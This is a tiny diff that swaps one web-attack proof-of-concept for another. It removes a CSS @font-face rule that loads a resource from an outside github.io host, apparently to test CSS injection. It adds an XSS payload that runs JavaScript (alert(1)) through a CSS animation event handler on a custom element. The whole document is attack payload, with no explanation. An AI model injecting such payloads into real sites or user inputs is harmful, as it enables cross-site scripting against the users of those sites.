@@ -1,9 +1,1 @@
-@font-face{
- font-family:poc;
- src: url(https://p0c0ng.github.io/testh1.js); /* fetched */
- unicode-range:U+0041;
-}
-
-#selected_details{
- font-family:poc;
-}
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
